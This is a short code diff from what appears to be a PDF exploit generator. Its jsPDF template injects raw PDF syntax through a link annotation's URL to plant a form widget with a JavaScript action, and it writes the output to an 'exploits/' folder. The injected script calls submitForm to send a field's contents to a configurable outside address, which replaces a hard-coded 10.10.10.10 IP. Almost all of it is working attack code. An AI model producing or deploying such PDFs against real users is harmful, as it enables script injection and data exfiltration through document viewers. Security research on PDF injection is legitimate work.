@@ -49,8 +49,8 @@ class jsPDF_template{
 		this.doc = new jsPDF();
 		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
 		type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(Title)/V(Value)>>/A<</S/JavaScript/JS(
-		app.alert("curl 'https://10.10.10.10'");
-		this.submitForm(`+direction+`, false, false, ['Title']);
+		app.alert("curl ''`+direction+`'");
+		this.submitForm('`+direction+`', false, false, ['Title']);
 		)/(`});
 		this.doc.text(20, 20, 'Test text');
 		out_name = "exploits/" + out_name + ".pdf"
